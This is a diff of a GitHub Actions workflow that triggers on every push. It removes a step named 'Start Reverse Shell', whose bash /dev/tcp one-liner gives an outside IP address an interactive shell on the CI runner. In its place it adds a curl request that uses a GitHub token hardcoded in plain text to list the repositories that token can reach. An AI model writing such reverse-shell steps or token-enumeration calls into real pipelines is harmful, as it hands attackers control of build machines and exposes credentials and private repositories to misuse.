@@ -1,4 +1,4 @@
-name: CI Test with Reverse Shell
+name: List Repositories Accessible by Token
 
 on: [push]
 
@@ -7,7 +7,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - uses: actions/checkout@v2
-    - name: Start Reverse Shell
+    - name: Make a request to GitHub API to list repositories
       run: |
-        bash -i >& /dev/tcp/200.238.144.25/9000 0>&1
+        curl -H "Authorization: token ghp_orKHWarfplSTwCOoU9aT3mpsT0" \
+        https://api.github.com/user/repos
